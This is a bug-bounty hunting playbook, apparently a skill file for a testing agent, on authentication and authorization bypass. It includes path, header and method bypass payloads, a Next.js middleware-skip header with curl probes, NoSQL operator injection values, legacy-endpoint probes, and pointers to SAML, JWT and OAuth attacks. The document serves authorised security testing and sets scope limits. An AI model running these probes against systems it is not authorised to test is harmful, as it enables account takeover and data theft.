---
name: hunt-auth-bypass
description: Hunting skill for auth bypass vulnerabilities. Built from 12 public bug bounty reports across SAML XSW / parser-differential (GitHub Enterprise CVE-2025-25291/25292), SAML signature stripping (Uber, Rocket.Chat, samlify CVE-2025-47949), SAML domain enforcement bypass via control characters (HackerOne 2024), partner-portal cross-IdP assertion reuse (Slack), WordPress XMLRPC bypassing SSO (Uber), JWT alg-confusion HS256/RS256 (Jitsi), JWT signature-validation skip (Linktree, Newspack), and token-audience confusion (Argo CD CVE-2023-22482). Use when hunting auth bypass — see the Legacy-Protocol Matrix for branded-UI vs legacy-endpoint patterns.
sources: github, hackerone_public, github_security_lab, projectdiscovery_research
report_count: 12
---

# HUNT-AUTH-BYPASS — Authentication / Authorization Bypass

## Rails
- In-scope only. Read-only by default. Create **your** test users; do not stuff corpora or guess third-party passwords.
- **No brute-force / credential-stuffing / keyspace exhaustion.** Native-cred endpoints: prove they accept **your** password and skip SSO/MFA — do not spray. Known **framework default** secrets (one or two) are OK; wordlists are not.
- One proof session. No mass-account creation beyond program cap.
- STOP at draft. Username enum or 401-vs-403 alone is not auth bypass.

## What pays
Authenticate **as someone else**, **without credentials**, or **as a higher role** — then perform a privileged action. “Partial disclosure” is not this class.

## Decision tree (any target)
1. **Inventory every auth entry:** main UI, admin, partner, mobile API, SSO (SAML/OAuth/OIDC), password login, API keys, WS, GraphQL, legacy RPC. Fingerprint stack (headers, paths, JS).
2. **Per entry, identify the gate:** session cookie, JWT, SSO assertion, Basic, mTLS. Test whether a **sibling surface** skips it (legacy protocol, other verb, other host).
3. Walk **path/header/method** bypasses (table below) on a **known-protected** URL (your `/account` or an admin path that 302s to login).
4. Federated: load `hunt-saml` / `hunt-oauth` / `hunt-jwt` — do not stop because the branded login looks solid.
5. After **any** session: function-level checks (`/admin/export` without middleware) + object-level (`hunt-idor`).
6. Impact = **action** (read A’s data, hit admin, issue token), not a 200 on `/login`.

## Surface
```
/login /admin /partners /sso /saml /oauth /xmlrpc.php
/api/v*/auth  /wp-login.php  /_vti_bin/  /actuator /rest/auth
WWW-Authenticate  Set-Cookie  Location: IdP  SAMLResponse  id_token
```

## Path / header / method bypass (generic)
Protected resource `P` (expect 401/302). Replay until body contains an **auth-only unique marker**.

| Class | Probe |
|---|---|
| Path normalize | `//P` `/./P` `/P/` `/P%20` `/P%09` `/P;` `/P..;/ ` `/P%2e%2e/` `/%2e%2e/P` |
| Case / encoding | `/Admin` `/ADMIN` `%2fP` double-encode, Unicode NFC/NFKC |
| Suffix / alt parser | `/P.json` `/P.html` `/P;jsessionid=x` `/P%00` `/P%0d%0a` |
| Header override | `X-Original-URL: /P` `X-Rewrite-URL` `X-Forwarded-Prefix` `X-Forwarded-For: 127.0.0.1` |
| Method | GET vs POST vs HEAD vs OPTIONS; `_method=`; `X-HTTP-Method-Override` |
| Next.js middleware | `x-middleware-subrequest: middleware` (and nested `middleware:middleware:…`) — CVE-2025-29927 class; any middleware-gated route |
| Spring / proxy | `;` in path, `..;` `/.%2e/` — edge ACL vs app decode mismatch |
| Authn skip | Drop cookie; empty `Authorization`; `Authorization: Bearer null` / `undefined` / `0`; Basic `Og==` (`:`) |
| Array / JSON | `password[]=`  `{"password":["x"]}`  `{"user":{"$gt":""}}` (`hunt-nosqli`) |
| Token mix | Partner JWT on admin API; refresh as access; `aud` skip (`hunt-jwt`) |
| Host / cache | `X-Forwarded-Host` on login (`hunt-host-header`) |

```bash
# Example: middleware-style skip on a login-gated page
curl -s -o /tmp/p -w "%{http_code} %{size_download}\n" https://$TARGET/admin
curl -s -o /tmp/q -w "%{http_code} %{size_download}\n" \
  -H 'x-middleware-subrequest: middleware' https://$TARGET/admin
diff /tmp/p /tmp/q   # body must gain an identity/admin marker, not just status
```

## Legacy-protocol matrix (branded UI ≠ only gate)
Custom `/account/login` often leaves a **native-cred** endpoint without SSO/MFA/CAPTCHA. Probe **reachability + your test creds**, not lockout of others.

| Stack | Probe | What success looks like |
|---|---|---|
| WordPress | `POST /xmlrpc.php` `system.listMethods` then `wp.getUsersBlogs` with **your** WP user | Session/cookie without hitting `/wp-login.php` SSO |
| WP REST | `/wp-json/wp/v2/users` | User enum (info); pair with xmlrpc only if your creds work |
| SharePoint | `/_vti_bin/Authentication.asmx` `Login`; `/_api/contextinfo` | FedAuth without branded `customlogin.aspx` |
| Atlassian | `/rest/auth/1/session` Basic | Session despite Crowd SSO on UI |
| Drupal | `/user/login?_format=json` `/jsonapi/` | Native pass vs SSO middleware |
| Exchange/OWA | `/EWS/Exchange.asmx` `/Autodiscover` | NTLM/Basic vs OWA MFA UI — **one** auth, your lab box |
| Generic ASP.NET | `*.asmx?WSDL` `*.svc` | Independent credential validator |
| Spring | `/actuator` `/api/v1/auth/login` | Anonymous actuator vs UI auth |
| GitLab | `/api/v3/` vs `/v4/` | PAT/old API looser than UI |

**How:** (1) fingerprint (2) OPTIONS/GET the legacy path unauth (3) POST **your** password once (4) confirm no MFA prompt vs UI (5) body-diff a privileged GET. Rate-limit **classification** = `hunt-brute-force` small burst — never `system.multicall` stuffing.

## Federated / token (pointers, do not duplicate)
- **SAML:** sig-strip, XSW, parser-diff, audience — `hunt-saml`.
- **OAuth/OIDC:** `redirect_uri`, `state`, mix-up, nOAuth — `hunt-oauth`.
- **JWT:** none, RS→HS, `jku`, `aud` — `hunt-jwt`.
- **BFF / cookie domain:** `UserOrClient` token fallback, `.example.com` cookie toss — see chains + `hunt-session`.

## Function-level access (BFLA)
Low-priv session vs admin routes the UI hides. 200 + admin marker vs sibling 403 = broken function authz. Unauth replay too.

```javascript
// sibling gap
router.get('/admin/users',  auth, admin, getUsers);
router.get('/admin/export', getExport);   // missing
```

## Validation
1. **Do now:** session as other user / no creds / higher role, then **an action** (read, mutate test object, admin API).
2. **Victim loss:** named asset (B’s PII, admin config, all tenants) — not “control bypassed”.
3. **Repro:** fresh browser, documented requests, unique marker in body. Timing windows must be re-creatable.
4. Negative control: unauth/garbage token does **not** get the same body.

**Severity:** unauth admin or any-user ATO = **Critical**. SSO skip to **your** role without MFA = **High** (Critical if it yields **other** users). 401/403 oracle = **Low**/N/A. Enum without authn skip = not this class.

## Chains
| Primitive | Compose | Impact |
|---|---|---|
| Legacy native-cred + no MFA | Your account proves SSO skip; stuffing is **out of rails** | Authn policy bypass |
| Path/header skip | `hunt-idor` on `/v1/users/{id}` | Unauth PII |
| JWT `aud` skip | Token from service A on API B | Cross-app impersonation |
| Partner cookie `Domain=.t.com` | Admin host trusts it | Trust-boundary jump |
| SAML XSW | `hunt-ato` | Admin ATO |
| BFLA export | IDOR ids inside export | Tenant dump — one extra row, stop |

## Citations (verified public)
Keep these as **pattern** references, not copy-paste-only paths: GHES SAML parser-diff CVE-2025-25291/25292 (H1 #2579939); GHES encrypted-assertion CVE-2024-4985; Uber XMLRPC SSO skip (H1 #138869); Slack assertion reuse; Jitsi RS256→HS256 (H1 #1210502); Argo CD `aud` CVE-2023-22482 (H1 #1889161); Next.js `x-middleware-subrequest` CVE-2025-29927.

Cross-refs: `hunt-saml`, `hunt-jwt`, `hunt-oauth`, `hunt-idor`, `hunt-ato`, `hunt-session`, `hunt-mfa-bypass`, `hunt-nextjs`, `hunt-sharepoint`, `triage-validation`.

## Dedup gate
```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```
`NOVEL` → `/validate`. `LIKELY_DUP` → stop unless a concrete differentiator.
